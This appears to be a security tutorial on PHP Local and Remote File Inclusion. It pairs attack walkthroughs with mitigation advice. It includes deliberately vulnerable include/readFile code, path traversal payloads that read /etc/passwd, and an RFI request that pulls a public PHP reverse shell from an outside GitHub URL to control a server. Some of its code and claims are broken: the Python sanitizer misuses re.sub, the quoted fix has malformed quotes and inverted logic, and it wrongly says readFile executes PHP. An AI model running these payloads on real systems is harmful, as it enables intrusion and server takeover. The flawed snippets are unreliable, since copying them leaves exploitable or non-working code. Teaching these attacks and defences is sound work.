# Local and Remote FIle Inclusion


## Definitions

**RFI** and **LFI** are one of the web security threats presented on [**OWASP**](https://owasp.org/). they allow attackers to get unethical access to server resources and get likely control over the webserver

### LFI (Local File Inclusion)

LFI is the process of **including** already locally existed files through exploiting the vulnerability of **inclusion** implemented on the web application. 

This Vulnerability occurs due to poor **validation** and **sanitization** of input file and path. This vulnerability can expose important information or may lead to internal [**DOS attack**](https://www.cloudflare.com/learning/ddos/glossary/denial-of-service/), Code execution on the server and leak sensitive information disclosure.<sup>[1](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)</sup>


### RFI (Remote File Inclusion)

RFI stands for Remote File Inclusion. a client-to-server web attack that exploits website poor content validation to upload custom malicious scripts, Which will lead eventually to execute this scripts on the server (**eg.** *JavaScript scripts*, *powershell*, *bash*).<sup>[2](https://imanagerpublications.com/assets/pdfDownload/JIT/2015/03JIT_August_15/JITAugust15RP03.pdf)</sup>


## Performing LFI attack

### Step by Step guide LFI attack

LFI happens when files are passed to inclusion for example let's take this next example : 

``GET https://localhost:8080/preview.php?file=example.php``

The vulnerable script goes as following
```php
<?php
$file = $_GET['file'];

// Include the file specified in the "file" parameter
include($file);
?>

```

The scripts use ``$_GET['file']`` to get the file name included on **URL** and then **include** it directly into the page.

If the application doesn't use appropriate validation or sanitization techniques in the given **file** parameter, We can technically exploit this.

For example, let's try to include the [passwd](https://en.wikipedia.org/wiki/Passwd#:~:text=The%20%2Fetc%2Fpasswd%20file%20is,identities%20that%20own%20running%20processes.) file located on /etc/passwd, We will insert the following code ../../../etc/passwd

the link goes as following ``GET https://localhost:8080/preview.php?file=../../../etc/passwd``

in another perspective, this code get executed

```php
include("../../../etc/passwd");
```

The double points (..) tells php to go back to the parent directory of the **local path**. for example, If the webpage is uploaded on **/www/page/php/preview.php** we are telling to go back to the root directort ``/`` then goes to ``etc/passwd``

If the website is vulnerable this injection will return something similar to this on the webpage **preview.php**

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

As you can see, this attack is so simple. You can inject multiple **queries** until you successfully get a legit response. such as :

```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
```

## Sanitization and protection

You can protect your server from **LFI** exploit by implementing one of the following solutions:

### **Create whitelist** 
create a whitelist of trusted files
```php
// Script example

<?php
$allowedFiles = [
    'home' => 'home.php',
    'about' => 'about.php',
    'contact' => 'contact.php',
    'help' => 'help.php'
];

$fileKey = $_GET['file'];

if (array_key_exists($fileKey, $allowedFiles)) {
    include($allowedFiles[$fileKey]);
}
?>
```
### **Disable inclusion**
This solution disable including for all files on the *php.ini* config file. this might not be very pratical but due of the high risk of **LFI** vulnerability, it's very recommended

```ini
allow_url_include = Off ; Disable all file inclusions
max_execution_time = 30
file_uploads = On
upload_max_filesize = 2M
max_file_uploads = 20
allow_url_fopen = Off ; Disable allow_url_fopen to prevent opening URLs with file functions 
```

### **Validate and sanitize all inputs** 
Add a layer of security where you detect and sanitize all attemps of performing **LFI** attack. This technique is so recommented to be implemented on a [reverse proxy](https://www.cloudflare.com/learning/cdn/glossary/reverse-proxy/).
<br><br>
<table align="center">
    <tr>
        <th>Attack Type</th>
        <th>Regex Pattern for Detection</th>
    </tr>
    <tr>
        <td><strong>LFI</strong></td>
        <td><code>(\.\.\/|\.\.\\)</code></td>
    </tr>
    <tfoot>
        <tr>
            <td colspan="2"><strong>Table 1 : LFI Attack Detection</strong></td>
        </tr>
    </tfoot>
</table>

This **regex** will detect attempts to access unauthorized files on *application layer* then it will be sanitized with the following code : 

```python
import re

def sanitize_input(user_input,regex):
    sanitized = re.sub(regex,user_input) # remove threat
    return sanitized 

# example usage

user_input = "http://vulnerable_host/preview.php?file=../../../../etc/passwd"
sanitized = sanitize_input(user_input,r'(\.\.\/|\.\.\\)')
print(sanitized)
```

## Performing RFI attack

### Step by Step guide RFI attack

Assuming we have found a vulnerable website going as ``https://localhost:8080/index.php?page=home``

This website was made to pull data from text files and **render** them to a webpage.

```php
// Insecure PHP file that allow RFI attack

<?php

$file = $_GET['page'];
if (!empty($file)) {
    readFile($file);
}

?>
```
**explaining script** : This script open the file included on the url **parameter** ``page``. The file would be read with ``readFile`` function which can execute **php** script.


Let's inject a malicious **PHP** script. I found this [reverse shell script](https://www.imperva.com/learn/application-security/reverse-shell/) open-sourced in github ``https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php``

We inject this as following 

``GET https://localhost:8080/index.php?page=https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php``

A successful **RFI** attack will inject this script into the server which will let you remotely control the server.

<figure align="center">
  <img src="pictures/LFI RFI/c99.jpg" alt="C99">
  Figure 1: Successful inject reverse shell (C99 Shell)
</figure>

<br>
<br>

## Sanitization and protection (RFI)

To protect your server from **RFI** attacks you can use the same techniques we discussed on [LFI Sanitization and protection](#sanitization-and-protection)

### Sanitizing input

We can sanitize input with the following regex :

<table align="center">
    <tr>
        <th>Attack Type</th>
        <th>Regex Pattern for Detection</th>
    </tr>
    <tr>
        <td><strong>RFI</strong></td>
        <td><code>\b[a-zA-Z0-9_]+=https?:\/\/[^&amp;]+</code></td>
    <tfoot>
        <tr>
            <td colspan="2"><strong>Table 2 : RFI Attack Detection</strong></td>
        </tr>
    </tfoot>
    </tr>
</table>

and the same script described on [LFI Sanitization and protection](#sanitization-and-protection)

Another solution proposed by [BHARTI NAGPAL , NARESH CHAUHAN and NANHAY SINGH](https://imanagerpublications.com/assets/pdfDownload/JIT/2015/03JIT_August_15/JITAugust15RP03.pdf) was to convert the content of the malicious file to pdf or text. they proposed the following code to fix the issue 

```php
<?php
    $format = „convert_2_text‟;
    if (!isset( $_GET['FORMAT'] ) )
    {
    if ( $ _GET['FORMAT'] == “convert_2_text” ||$_GET['FORMAT'] ==“convert_2_pdf” ||
    $_GET['FORMAT'] ==“convert_2_html”) {
        $format = $_GET['FORMAT'];
    }
    include($format.'.php' );
    }
?>
```

In my humble opinion, I believe that a proper sanitization on reverse proxy level is more **efficient**, **faster** and less **resource consuming**.

## Conclusion

We have discussed in this topic the implementation of an **RFI/LFI** vulnerability and we introduced different techniques to prevent such an attack to happen. In conclusion, we find that always using regex detection and simple **sanitization** to be more effective especially on a mitigation system that doesn't really make modification on local pages hosted by our clients.  Our approach is focused on explicitly securing our clients' hosts.